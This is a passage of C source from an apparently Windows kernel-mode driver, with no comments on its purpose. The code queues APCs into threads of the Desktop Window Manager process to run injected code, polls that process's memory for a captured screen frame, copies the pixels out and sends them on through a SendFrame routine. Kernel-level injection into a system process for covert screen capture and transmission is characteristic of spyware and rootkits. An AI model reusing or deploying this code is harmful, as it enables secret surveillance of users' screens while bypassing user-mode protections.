    /* ---- reset Ready flag (just 8 bytes, not the whole 32MB params) ---- */
    {
        LONG zero = 0;
        LONG neg1 = -1;
        WriteRemote(g_Dwm,
            (PUCHAR)g_RemoteParams + FIELD_OFFSET(SC_PARAMS, Ready),
            &zero, sizeof(zero));
        WriteRemote(g_Dwm,
            (PUCHAR)g_RemoteParams + FIELD_OFFSET(SC_PARAMS, Status),
            &neg1, sizeof(neg1));
    }

    /* ---- queue APC (cached thread first, fallback scan) ---- */
    {
        LARGE_INTEGER dly;
        dly.QuadPart = -50000;   /* 5 ms */

        if (g_CachedTid) {
            st = QueueUserApc(g_CachedTid, g_RemoteCode, g_RemoteParams);
            if (NT_SUCCESS(st)) {
                ULONG poll;
                for (poll = 0; poll < 200; poll++) {
                    ReadRemote(g_Dwm,
                        (PUCHAR)g_RemoteParams + FIELD_OFFSET(SC_PARAMS, Ready),
                        &ready, sizeof(ready));
                    if (ready) break;
                    KeDelayExecutionThread(KernelMode, FALSE, &dly);
                }
            }
            if (!ready) g_CachedTid = NULL;
        }

        if (!ready) {
            ULONG ti;
            for (ti = 0; ti < g_AllTidCount && !ready; ti++) {
                LONG zero = 0;
                WriteRemote(g_Dwm,
                    (PUCHAR)g_RemoteParams + FIELD_OFFSET(SC_PARAMS, Ready),
                    &zero, sizeof(zero));
                st = QueueUserApc(g_AllTids[ti], g_RemoteCode, g_RemoteParams);
                if (!NT_SUCCESS(st)) continue;
                {
                    ULONG poll;
                    for (poll = 0; poll < 100; poll++) {
                        ReadRemote(g_Dwm,
                            (PUCHAR)g_RemoteParams + FIELD_OFFSET(SC_PARAMS, Ready),
                            &ready, sizeof(ready));
                        if (ready) break;
                        KeDelayExecutionThread(KernelMode, FALSE, &dly);
                    }
                }
                if (ready) {
                    g_CachedTid = g_AllTids[ti];
                    LOG("APC: cached tid=%u", (ULONG)(ULONG_PTR)g_AllTids[ti]);
                }
            }
        }

        if (!ready) {
            if ((g_FrameCount & 15) == 0)
                LOG("ScreenCapture: APC timeout (frame %u)", g_FrameCount);
            g_FrameCount++;
            return STATUS_TIMEOUT;
        }
    }

    /* ---- read result + send ---- */
    {
        SC_PARAMS hdr;
        ULONG w, h, frameSize;

        RtlZeroMemory(&hdr, sizeof(hdr));
        st = ReadRemote(g_Dwm, g_RemoteParams, &hdr, sizeof(hdr));
        if (!NT_SUCCESS(st)) { g_FrameCount++; return st; }
        if (hdr.Status != 0) { g_FrameCount++; return STATUS_UNSUCCESSFUL; }

        w = hdr.Width; h = hdr.Height; frameSize = hdr.FrameSize;
        if (frameSize == 0 || frameSize > SC_MAX_FRAME) {
            g_FrameCount++;
            return STATUS_INVALID_BUFFER_SIZE;
        }

        /* Reuse pixel buffer if same size */
        if (g_PixelBufSize < frameSize) {
            if (g_PixelBuf) ExFreePoolWithTag(g_PixelBuf, TAG_SS);
            g_PixelBuf = ExAllocatePool2(POOL_FLAG_PAGED, frameSize, TAG_SS);
            if (!g_PixelBuf) { g_PixelBufSize = 0; g_FrameCount++; return STATUS_INSUFFICIENT_RESOURCES; }
            g_PixelBufSize = frameSize;
        }

        st = ReadRemote(g_Dwm,
                (PUCHAR)g_RemoteParams + SC_PIXEL_OFFSET,
                g_PixelBuf, frameSize);
        if (!NT_SUCCESS(st)) { g_FrameCount++; return st; }

        st = SendFrame(w, h, (PUCHAR)g_PixelBuf, frameSize);
    }

    g_FrameCount++;
    return st;
}
